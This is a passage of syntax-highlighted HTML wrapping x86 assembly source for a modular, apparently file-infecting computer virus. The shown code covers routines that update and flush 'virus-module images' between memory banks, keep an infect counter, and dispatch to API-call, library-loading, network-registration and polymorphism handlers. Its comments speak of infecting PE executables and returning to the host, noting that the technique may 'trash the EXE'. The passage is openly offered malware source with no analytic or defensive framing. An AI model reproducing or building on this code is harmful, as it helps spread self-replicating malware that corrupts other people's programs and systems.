</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; set new place</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">skipupdatingit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Update bank</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Update bank alias #34 is divided in 5 part</span><span class="sc0">
</span><span class="sc1">;   a short header:     0   Cec! marker</span><span class="sc0">
</span><span class="sc1">;               4   Bank #33 version, Initially set to zero</span><span class="sc0">
</span><span class="sc1">;               8   Bank #34 version, Initially set to zero</span><span class="sc0">
</span><span class="sc1">;               12  Infect counter, Initially set to zero</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   from there, 5 part of modulesize byte, wich contain modules</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">SetBank34Module</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;pushad</span><span class="sc0">
</span><span class="sc1">;mov    ecx,34</span><span class="sc0">
</span><span class="sc1">;call   LoadBankInfo</span><span class="sc0">
</span><span class="sc1">;popad</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;mov    dword ptr [edx+8],eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ret</span><span class="sc0">

</span><span class="sc5">FlushModule</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; flush module to virus image</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc1">; Your Pain is a white bowl of healing light</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load the virus-module images</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'!CeC'</span><span class="sc0">      </span><span class="sc1">; Check flush module consistancy</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipflush</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; set esi as source module</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getuservalue</span><span class="sc0">            </span><span class="sc1">; check if nobody use the user value</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipflush</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; set it as busy</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setuservalue</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">33</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load the virus-module images</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; set it as dest</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">+(</span><span class="sc5">PointerTable</span><span class="sc4">-</span><span class="sc5">VirusStart</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; seek to pointer table in dest</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">modulenumber</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; set it as end of module</span><span class="sc0">

</span><span class="sc1">; eh, see all the version updated!</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; load new version</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; then set it as old version</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; then set it as flush immage version</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; set it as header version</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; esi is pointing now to the start of </span><span class="sc0">
                    </span><span class="sc1">; mods</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; nullify ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">      </span><span class="sc1">; set a nop there</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; increment edi</span><span class="sc0">

</span><span class="sc5">loopitagain</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; set current pos in dest</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; from the end of pointer table</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">    </span><span class="sc1">; put new offset</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; save counter</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; load the size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">; copy to the buffer</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; add fix module size </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">modulesize</span><span class="sc0">          

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; load the module number</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">modulenumber</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">loopitagain</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; specify the size</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; nullify the user value</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setuservalue</span><span class="sc0">

</span><span class="sc5">skipflush</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getuservalue</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load the flushing-module images</span><span class="sc0">

</span><span class="sc5">getthisoneb</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">getthisoneb</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">setuservalue</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load the flushing-module images</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">incuservalue</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load the flushing-module images</span><span class="sc0">

</span><span class="sc5">getthisonec</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">getthisonec</span><span class="sc0">         </span><span class="sc1">; dont overwrite fucked value</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; increment pass byte</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">decuservalue</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">            </span><span class="sc1">; load the flushing-module images</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; decrement pass byte</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; esi = modul origin</span><span class="sc0">
</span><span class="sc1">; ecx = module number</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">DirectUpdate</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadBankInfo</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">modulesize</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; What modulization assume:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - a routine handler, that may give to routines the power to call </span><span class="sc0">
</span><span class="sc1">;     comon routines and to interact with the common memory buffer. The </span><span class="sc0">
</span><span class="sc1">;     routine is unused, instead of the Oxygen model where it's very very </span><span class="sc0">
</span><span class="sc1">;     used but kept for future use, ah yes, it's used to perform api calls</span><span class="sc0">
</span><span class="sc1">;   - to build a complete and most updated image of the virus included </span><span class="sc0">
</span><span class="sc1">;     latest techs</span><span class="sc0">
</span><span class="sc1">;   - to perform sub module calling, and managing untill the entrypoint</span><span class="sc0">
</span><span class="sc1">;     done also for Init - wich is a basic call and return the InitVal</span><span class="sc0">
</span><span class="sc1">;     that should be PE loaded base</span><span class="sc0">
</span><span class="sc1">;     and Fini that is basically a link to the infect procedure that is</span><span class="sc0">
</span><span class="sc1">;     basically a return to host.</span><span class="sc0">
</span><span class="sc1">;     Note that to deal with this, you need to have a fini compliant with</span><span class="sc0">
</span><span class="sc1">;     EPOZero norms, wich mean keeping a few (primordial) data before the</span><span class="sc0">
</span><span class="sc1">;     PE header, well yes, they may trash the EXE before but who care of </span><span class="sc0">
</span><span class="sc1">;     it ?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Modules have two version in them, the system </span><span class="sc0">
</span><span class="sc1">;       (wich is actually 1) and their own, the EPOZero norm is a bit</span><span class="sc0">
</span><span class="sc1">;       advanced but usable with a few effort to all technologies.</span><span class="sc0">
</span><span class="sc1">;       it needs to drop the return of a call that will be patched by</span><span class="sc0">
</span><span class="sc1">;       a known value</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - Internal purpose:-Build virus to the bank #33 (wich is inexistant 4</span><span class="sc0">
</span><span class="sc1">;               the programmer,wich make it unaccessible in theory)</span><span class="sc0">
</span><span class="sc1">;              -Copy the most updated virus from #33 to bank X</span><span class="sc0">
</span><span class="sc1">;              -Dispatching kernel Function</span><span class="sc0">
</span><span class="sc1">;              -Build mini virus version code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

    </span><span class="sc5">GetMapped</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">MApiCall</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc5">LoadLib</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">FApiCall</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc5">registernet</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">getvirversion</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc5">getmodpointer</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc5">DirectUpdateIt</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc5">LoadBankInfoIt</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc5">PolyMorphising</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">RoutineHandler</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; dispatching to Routine handler</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">GetMapped</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother0</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetMappedFile</span><span class="sc0">

</span><span class="sc5">getother0</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">MApiCall</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother1</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ApiCallit</span><span class="sc0">

</span><span class="sc5">getother1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">LoadLib</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother2</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loadhandle</span><span class="sc0">

</span><span class="sc5">getother2</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">FApiCall</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother3</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExtendedApiCall</span><span class="sc0">

</span><span class="sc5">getother3</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">registernet</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother4</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">registernet0</span><span class="sc0">

</span><span class="sc5">getother4</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">getvirversion</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother5</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">LoadUpdateVersion</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">getother5</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">getmodpointer</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother6</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoadModulePointer</span><span class="sc0">

</span><span class="sc5">getother6</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">DirectUpdateIt</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother7</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">DirectUpdate</span><span class="sc0">

</span><span class="sc5">getother7</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">LoadBankInfoIt</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother8</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoadBankInfo</span><span class="sc0">

</span><span class="sc5">getother8</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc5">PolyMorphising</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">getother9</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">PolyMorphiseIt</span><span class="sc0">

</span><span class="sc5">getother9</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">LoadModuleTable</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; here it is</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
